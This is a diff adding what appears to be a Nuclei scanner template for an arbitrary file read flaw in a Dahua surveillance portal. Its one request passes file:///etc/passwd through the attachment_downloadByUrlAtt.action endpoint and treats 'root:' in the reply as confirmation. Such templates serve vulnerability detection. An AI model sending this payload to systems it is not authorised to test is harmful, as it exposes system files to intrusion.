@@ -1,0 +1,23 @@
+id: dahua-jiankong-arbitrary-file-read
+info:
+  name: "Dahua 监控 portal 任意文件读取"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: Dahua
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+      - type: word
+        words:
+          - "/bin"
+      - type: word
+        words:
+          - "<!DOCTYPE"
+        negative: true
+        part: body
